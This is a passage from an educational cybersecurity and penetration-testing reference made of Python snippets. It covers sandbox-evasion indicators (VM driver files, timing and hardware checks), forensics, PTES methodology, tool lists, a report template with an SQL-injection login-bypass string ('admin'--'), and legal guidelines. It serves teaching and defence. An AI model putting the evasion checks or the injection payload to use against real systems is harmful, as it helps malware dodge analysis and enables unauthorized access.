        """Check for VM-specific files/registry."""
        vm_files = [
            'C:\\Windows\\System32\\drivers\\vmmouse.sys',  # VMware
            'C:\\Windows\\System32\\drivers\\vmtoolsd.exe',
            'C:\\Windows\\System32\\drivers\\VBoxMouse.sys',  # VirtualBox
        ]
        print("VM artifacts to check:")
        for f in vm_files:
            print(f"  {f}")
    
    def check_timing(self):
        """Timing-based detection."""
        print("\nTiming checks:")
        print("  - RDTSC instruction (CPU cycles)")
        print("  - Sleep timing (sandboxes accelerate time)")
        print("  - Mouse movement patterns")
    
    def check_hardware(self):
        """Hardware fingerprinting."""
        print("\nHardware checks:")
        print("  - CPUID instruction (hypervisor bit)")
        print("  - Low RAM (<2GB suspicious)")
        print("  - Single CPU core")
        print("  - Small disk size")
    
    def check_user_interaction(self):
        """Check for user activity."""
        print("\nUser interaction checks:")
        print("  - Mouse movement in last N seconds")
        print("  - Recent documents")
        print("  - Browser history")
        print("  - Clipboard content")

evasion = SandboxEvasion()
evasion.check_vm_artifacts()
evasion.check_timing()
evasion.check_hardware()
evasion.check_user_interaction()

CHAPTER 8: FORENSICS
File Hashing and Integrity
# Cryptographic hashing for forensic integrity

def compute_file_hashes(filepath):
    """Compute multiple hashes of a file."""
    import hashlib
    
    hashes = {
        'md5': hashlib.md5(),
        'sha1': hashlib.sha1(),
        'sha256': hashlib.sha256(),
    }
    
    try:
        with open(filepath, 'rb') as f:
            while chunk := f.read(8192):
                for h in hashes.values():
                    h.update(chunk)
        
        return {name: h.hexdigest() for name, h in hashes.items()}
    except FileNotFoundError:
        return None

# Example (create test file)
import tempfile
import os

with tempfile.NamedTemporaryFile(delete=False, mode='w') as f:
    f.write("This is a test file for forensic analysis.")
    temp_path = f.name

try:
    hashes = compute_file_hashes(temp_path)
    print("=== File Integrity Hashes ===")
    for name, value in hashes.items():
        print(f"  {name.upper():8s}: {value}")
finally:
    os.unlink(temp_path)

Metadata Extraction
# Extract metadata from files (EXIF, PDF, Office docs)

class MetadataExtractor:
    """Extract metadata from various file types."""
    
    def extract_pdf_metadata(self, pdf_content):
        """Extract basic PDF metadata."""
        metadata = {}
        
        # Look for metadata markers
        markers = ['/Author', '/Creator', '/Producer', '/CreationDate', '/ModDate']
        
        for marker in markers:
            idx = pdf_content.find(marker)
            if idx != -1:
                # Extract value (simplified)
                start = pdf_content.find('(', idx)
                end = pdf_content.find(')', start)
                if start != -1 and end != -1:
                    metadata[marker[1:]] = pdf_content[start+1:end]
        
        return metadata
    
    def extract_office_metadata(self, docx_content):
        """Extract Office document metadata."""
        # Real implementation: parse XML inside ZIP
        metadata = {
            'Author': 'Unknown',
            'LastModifiedBy': 'Unknown',
            'Created': 'Unknown',
            'Modified': 'Unknown',
        }
        return metadata
    
    def extract_image_metadata(self, image_data):
        """Extract EXIF metadata from images."""
        # Real implementation: parse EXIF headers
        metadata = {
            'Camera': 'Unknown',
            'DateTime': 'Unknown',
            'GPS': 'Unknown',
            'Software': 'Unknown',
        }
        return metadata

# Example
extractor = MetadataExtractor()

fake_pdf = b"""
%PDF-1.4
/Author (John Doe)
/Creator (Microsoft Word)
/Producer (Adobe PDF)
/CreationDate (D:20240115120000)
"""

metadata = extractor.extract_pdf_metadata(fake_pdf.decode('latin-1'))
print("\n=== PDF Metadata ===")
for key, value in metadata.items():
    print(f"  {key}: {value}")

Timeline Analysis
# Create timeline of file system events

class ForensicTimeline:
    """Build timeline from file system events."""
    
    def __init__(self):
        self.events = []
    
    def add_event(self, timestamp, event_type, path, details=""):
        """Add event to timeline."""
        self.events.append({
            'timestamp': timestamp,
            'type': event_type,
            'path': path,
            'details': details
        })
    
    def sort_timeline(self):
        """Sort events chronologically."""
        self.events.sort(key=lambda x: x['timestamp'])
    
    def display(self, start=None, end=None):
        """Display timeline."""
        self.sort_timeline()
        
        print("\n=== Forensic Timeline ===")
        for event in self.events:
            if start and event['timestamp'] < start:
                continue
            if end and event['timestamp'] > end:
                continue
            
            print(f"  [{event['timestamp']}] {event['type']:12s} "
                  f"{event['path']}")
            if event['details']:
                print(f"                 {event['details']}")
    
    def find_suspicious(self):
        """Find suspicious patterns."""
        print("\n=== Suspicious Activity ===")
        
        # Multiple files created in short time
        from collections import defaultdict
        by_minute = defaultdict(list)
        
        for event in self.events:
            minute = event['timestamp'][:16]  # YYYY-MM-DD HH:MM
            by_minute[minute].append(event)
        
        for minute, events in by_minute.items():
            if len(events) > 10:
                print(f"  🚨 {minute}: {len(events)} events (possible bulk activity)")

# Example
timeline = ForensicTimeline()

timeline.add_event("2024-01-15 10:00:00", "FILE_CREATE", "/tmp/exploit.py", "Malicious script")
timeline.add_event("2024-01-15 10:00:05", "PROCESS_START", "python exploit.py", "Execution")
timeline.add_event("2024-01-15 10:00:10", "NETWORK_CONN", "192.168.1.100:4444", "Reverse shell")
timeline.add_event("2024-01-15 10:01:00", "FILE_DELETE", "/var/log/auth.log", "Evidence destruction")
timeline.add_event("2024-01-15 10:05:00", "USER_LOGIN", "root", "Unauthorized access")

timeline.display()
timeline.find_suspicious()

Memory Forensics Concepts
# Memory forensics: analyze RAM dumps

class MemoryForensics:
    """Educational memory forensics concepts."""
    
    def list_artifacts(self):
        """List artifacts to extract from memory."""
        artifacts = [
            "Running processes",
            "Network connections",
            "Loaded DLLs/modules",
            "Open files/handles",
            "Registry hives",
            "Command history",
            "Clipboard content",
            "Browser history/cookies",
            "Encryption keys",
            "Passwords in memory",
            "Injected code",
            "Rootkit hooks",
        ]
        
        print("=== Memory Forensics Artifacts ===")
        for artifact in artifacts:
            print(f"  • {artifact}")
    
    def detection_techniques(self):
        """Common detection techniques."""
        techniques = [
            ("Process listing", "Compare pslist, pstree, psxview"),
            ("DLL analysis", "Check for injected/unlinked DLLs"),
            ("Network connections", "Netscan for suspicious connections"),
            ("Hook detection", "Check SSDT, IAT, inline hooks"),
            ("Malfind", "Find injected code in process memory"),
            ("YARA scanning", "Pattern match in memory"),
        ]
        
        print("\n=== Detection Techniques ===")
        for name, desc in techniques:
            print(f"  {name:20s}: {desc}")

memory = MemoryForensics()
memory.list_artifacts()
memory.detection_techniques()

CHAPTER 9: PENETRATION TESTING METHODOLOGY
PTES (Penetration Testing Execution Standard)
# Standard methodology for professional pen testing

class PenTestMethodology:
    """Penetration testing phases."""
    
    PHASES = [
        {
            'name': '1. Pre-Engagement',
            'activities': [
                'Define scope and rules of engagement',
                'Sign authorization and NDA',
                'Establish communication channels',
                'Determine testing type (black/gray/white box)',
            ]
        },
        {
            'name': '2. Intelligence Gathering',
            'activities': [
                'Passive recon (OSINT, WHOIS, DNS)',
                'Active recon (port scanning, service enumeration)',
                'Social engineering research',
                'Technology stack identification',
            ]
        },
        {
            'name': '3. Threat Modeling',
            'activities': [
                'Identify assets and attack surfaces',
                'Map potential attack vectors',
                'Prioritize targets by risk',
                'Develop attack hypotheses',
            ]
        },
        {
            'name': '4. Vulnerability Analysis',
            'activities': [
                'Automated scanning (Nessus, OpenVAS)',
                'Manual verification of findings',
                'Exploit research (ExploitDB, CVEs)',
                'Proof-of-concept development',
            ]
        },
        {
            'name': '5. Exploitation',
            'activities': [
                'Execute exploits against targets',
                'Gain initial access',
                'Document successful attacks',
                'Avoid detection (if required)',
            ]
        },
        {
            'name': '6. Post-Exploitation',
            'activities': [
                'Privilege escalation',
                'Lateral movement',
                'Data exfiltration (simulated)',
                'Persistence mechanisms',
            ]
        },
        {
            'name': '7. Reporting',
            'activities': [
                'Executive summary',
                'Technical findings with evidence',
                'Risk ratings (CVSS)',
                'Remediation recommendations',
            ]
        },
    ]
    
    def display_methodology(self):
        """Display full methodology."""
        print("=== Penetration Testing Methodology (PTES) ===\n")
        for phase in self.PHASES:
            print(f"📋 {phase['name']}")
            for activity in phase['activities']:
                print(f"   • {activity}")
            print()

methodology = PenTestMethodology()
methodology.display_methodology()

Reconnaissance Tools
# Common recon tools and techniques

class ReconTools:
    """Educational overview of recon tools."""
    
    def osint_tools(self):
        """Open Source Intelligence tools."""
        tools = {
            'theHarvester': 'Email, subdomain, IP enumeration',
            'Maltego': 'Visual link analysis',
            'Shodan': 'Internet-connected device search',
            'Censys': 'Internet-wide scanning data',
            'Recon-ng': 'OSINT framework',
            'SpiderFoot': 'Automated OSINT',
        }
        
        print("=== OSINT Tools ===")
        for tool, desc in tools.items():
            print(f"  {tool:15s}: {desc}")
    
    def scanning_tools(self):
        """Network scanning tools."""
        tools = {
            'Nmap': 'Port scanning, service detection, OS fingerprinting',
            'Masscan': 'Fast port scanner (internet-scale)',
            'Nikto': 'Web server scanner',
            'Dirb/Gobuster': 'Directory/file brute-forcing',
            'Wappalyzer': 'Technology identification',
        }
        
        print("\n=== Scanning Tools ===")
        for tool, desc in tools.items():
            print(f"  {tool:15s}: {desc}")
    
    def exploitation_tools(self):
        """Exploitation frameworks."""
        tools = {
            'Metasploit': 'Exploitation framework',
            'Burp Suite': 'Web application testing',
            'SQLmap': 'SQL injection automation',
            'Hydra': 'Password brute-forcing',
            'Aircrack-ng': 'Wireless attacks',
            'Cobalt Strike': 'Red team operations (commercial)',
        }
        
        print("\n=== Exploitation Tools ===")
        for tool, desc in tools.items():
            print(f"  {tool:15s}: {desc}")

recon = ReconTools()
recon.osint_tools()
recon.scanning_tools()
recon.exploitation_tools()

Reporting Template
# Professional penetration test report structure

class PentestReport:
    """Penetration test report template."""
    
    def __init__(self, client, scope, dates):
        self.client = client
        self.scope = scope
        self.dates = dates
        self.findings = []
        self.executive_summary = ""
    
    def add_finding(self, title, severity, description, evidence, remediation):
        """Add a finding to the report."""
        self.findings.append({
            'title': title,
            'severity': severity,  # Critical, High, Medium, Low, Info
            'description': description,
            'evidence': evidence,
            'remediation': remediation,
        })
    
    def generate_report(self):
        """Generate formatted report."""
        print("=" * 70)
        print("PENETRATION TEST REPORT")
        print("=" * 70)
        print(f"\nClient: {self.client}")
        print(f"Scope: {self.scope}")
        print(f"Dates: {self.dates}")
        
        # Executive summary
        print("\n" + "=" * 70)
        print("EXECUTIVE SUMMARY")
        print("=" * 70)
        
        severity_counts = {}
        for f in self.findings:
            severity_counts[f['severity']] = severity_counts.get(f['severity'], 0) + 1
        
        print(f"\nTotal findings: {len(self.findings)}")
        for sev in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            count = severity_counts.get(sev, 0)
            if count:
                print(f"  {sev:10s}: {count}")
        
        # Findings
        print("\n" + "=" * 70)
        print("DETAILED FINDINGS")
        print("=" * 70)
        
        for i, finding in enumerate(self.findings, 1):
            print(f"\n[{finding['severity']}] Finding #{i}: {finding['title']}")
            print("-" * 70)
            print(f"Description: {finding['description']}")
            print(f"Evidence: {finding['evidence']}")
            print(f"Remediation: {finding['remediation']}")

# Example report
report = PentestReport(
    client="Acme Corporation",
    scope="External web application (app.acme.com)",
    dates="2024-01-15 to 2024-01-19"
)

report.add_finding(
    title="SQL Injection in Login Form",
    severity="Critical",
    description="The login form is vulnerable to SQL injection, allowing authentication bypass.",
    evidence="POST /login username=admin'--&password=x returns authenticated session",
    remediation="Use parameterized queries. Implement input validation."
)

report.add_finding(
    title="Outdated SSL/TLS Configuration",
    severity="High",
    description="Server supports TLS 1.0 and weak cipher suites.",
    evidence="nmap --script ssl-enum-ciphers shows TLSv1.0 enabled",
    remediation="Disable TLS 1.0/1.1. Use only TLS 1.2+ with strong ciphers."
)

report.add_finding(
    title="Missing Security Headers",
    severity="Medium",
    description="Several security headers are not configured.",
    evidence="Missing: X-Frame-Options, Content-Security-Policy, HSTS",
    remediation="Implement recommended security headers."
)

report.generate_report()

CHAPTER 10: ADVANCED TOPICS AND RESOURCES
Red Team vs Penetration Testing
# Red Team: adversary simulation (long-term, stealthy)
# Pen Test: vulnerability assessment (short-term, thorough)

def compare_red_team_pentest():
    """Compare red team and penetration testing."""
    print("=== Red Team vs Penetration Testing ===\n")
    
    print("Penetration Testing:")
    print("  • Duration: Days to weeks")
    print("  • Goal: Find as many vulnerabilities as possible")
    print("  • Scope: Defined and limited")
    print("  • Detection: Not a concern")
    print("  • Output: Vulnerability report")
    
    print("\nRed Team Operations:")
    print("  • Duration: Weeks to months")
    print("  • Goal: Test detection and response capabilities")
    print("  • Scope: Unlimited (simulate real adversary)")
    print("  • Detection: Avoid detection (stealth)")
    print("  • Output: Attack narrative, lessons learned")

compare_red_team_pentest()

Bug Bounty Programs
# Platforms for ethical hackers to earn money

def bug_bounty_platforms():
    """List major bug bounty platforms."""
    platforms = {
        'HackerOne': 'Largest platform, 3000+ programs',
        'Bugcrowd': 'Crowdsourced security testing',
        'Synack': 'Vetted researchers, SRT platform',
        'Intigriti': 'European bug bounty platform',
        'YesWeHack': 'European platform',
        'Open Bug Bounty': 'Non-profit, XSS-focused',
    }
    
    print("=== Bug Bounty Platforms ===")
    for platform, desc in platforms.items():
        print(f"  {platform:20s}: {desc}")
    
    print("\n=== Tips for Success ===")
    tips = [
        "Start with VDPs (Vulnerability Disclosure Programs)",
        "Focus on one vulnerability class initially",
        "Read disclosed reports to learn",
        "Automate reconnaissance",
        "Write quality reports",
        "Be patient and persistent",
    ]
    for tip in tips:
        print(f"  • {tip}")

bug_bounty_platforms()

Certifications
# Professional cybersecurity certifications

def security_certifications():
    """List important certifications."""
    certs = {
        'Entry Level': [
            'CompTIA Security+',
            'CEH (Certified Ethical Hacker)',
            'eJPT (eLearnSecurity Junior Penetration Tester)',
        ],
        'Intermediate': [
            'OSCP (Offensive Security Certified Professional)',
            'CompTIA CySA+',
            'GIAC GPEN',
        ],
        'Advanced': [
            'OSCE³ (Offensive Security Certified Expert³)',
            'CISSP (Certified Information Systems Security Professional)',
            'CISM (Certified Information Security Manager)',
            'OSEP (Offensive Security Experienced Penetration Tester)',
        ],
        'Specialized': [
            'GPEN (GIAC Penetration Tester)',
            'GXPN (GIAC Exploit Researcher)',
            'GREM (GIAC Reverse Engineering Malware)',
            'CCIE Security (Cisco)',
        ],
    }
    
    print("=== Security Certifications ===\n")
    for level, cert_list in certs.items():
        print(f"{level}:")
        for cert in cert_list:
            print(f"  • {cert}")
        print()

security_certifications()

Learning Resources
# Recommended resources for learning cybersecurity

def learning_resources():
    """List learning resources."""
    print("=== Learning Resources ===\n")
    
    print("📚 Books:")
    books = [
        "The Web Application Hacker's Handbook",
        "Penetration Testing: A Hands-On Introduction",
        "Metasploit: The Penetration Tester's Guide",
        "Black Hat Python",
        "Violent Python",
        "The Hacker Playbook 3",
    ]
    for book in books:
        print(f"  • {book}")
    
    print("\n🎓 Online Platforms:")
    platforms = [
        "HackTheBox (htb.eu) - Practice labs",
        "TryHackMe (tryhackme.com) - Guided learning",
        "PortSwigger Web Security Academy - Free web security training",
        "PentesterLab - Hands-on exercises",
        "Cybrary - Video courses",
        "SANS Cyber Aces - Free fundamentals",
    ]
    for platform in platforms:
        print(f"  • {platform}")
    
    print("\n🏆 Practice Targets (Legal):")
    targets = [
        "DVWA (Damn Vulnerable Web App)",
        "Metasploitable 2/3",
        "OWASP Juice Shop",
        "VulnHub VMs",
        "HackTheBox machines",
        "PentesterLab exercises",
    ]
    for target in targets:
        print(f"  • {target}")
    
    print("\n📰 News and Blogs:")
    news = [
        "The Hacker News",
        "Krebs on Security",
        "Schneier on Security",
        "Google Project Zero",
        "PortSwigger Research",
        "Orange Tsai's Blog",
    ]
    for source in news:
        print(f"  • {source}")

learning_resources()

Legal and Ethical Considerations
# ⚠️  CRITICAL: Always follow legal and ethical guidelines

def legal_guidelines():
    """Display legal and ethical guidelines."""
    print("=" * 70)
    print("⚠️  LEGAL AND ETHICAL GUIDELINES ⚠️")
    print("=" * 70)
    
    print("\n✅ ALWAYS:")
    always = [
        "Get explicit written authorization before testing",
        "Stay within defined scope",
        "Document everything",
        "Report vulnerabilities responsibly",
        "Follow responsible disclosure timelines",
        "Respect privacy and data protection laws",
        "Use only legal tools and techniques",
    ]
    for item in always:
        print(f"  ✓ {item}")
    
    print("\n❌ NEVER:")
    never = [
        "Test systems without permission",
        "Exceed authorized scope",
        "Cause damage or disruption",
        "Steal or exfiltrate real data",
        "Share vulnerabilities publicly without permission",
        "Use skills for criminal purposes",
        "Ignore cease and desist orders",
    ]
    for item in never:
        print(f"  ✗ {item}")
    
    print("\n📜 Relevant Laws (varies by jurisdiction):")
    laws = [
        "Computer Fraud and Abuse Act (CFAA) - USA",
        "Computer Misuse Act - UK",
        "GDPR - EU (data protection)",
        "Cybercrime Convention (Budapest Convention)",
    ]
    for law in laws:
        print(f"  • {law}")
    
    print("\n💡 When in doubt, consult a lawyer!")

legal_guidelines()

Recommended Reading
# - "The Web Application Hacker's Handbook" by Stuttard & Pinto
# - "Penetration Testing" by Georgia Weidman
# - "Metasploit: The Penetration Tester's Guide"
# - "Black Hat Python" by Justin Seitz
# - "The Hacker Playbook 3" by Peter Kim
# - "Real-World Bug Hunting" by Peter Yaworski

# Online Resources
# - OWASP: https://owasp.org/
# - PortSwigger Web Security Academy: https://portswigger.net/web-security
# - HackTheBox: https://www.hackthebox.com/
# - TryHackMe: https://tryhackme.com/
# - ExploitDB: https://www.exploit-db.com/
# - CVE Details: https://www.cvedetails.com/
# - MITRE ATT&CK: https://attack.mitre.org/

# End of Cybersecurity & Penetration Testing Reference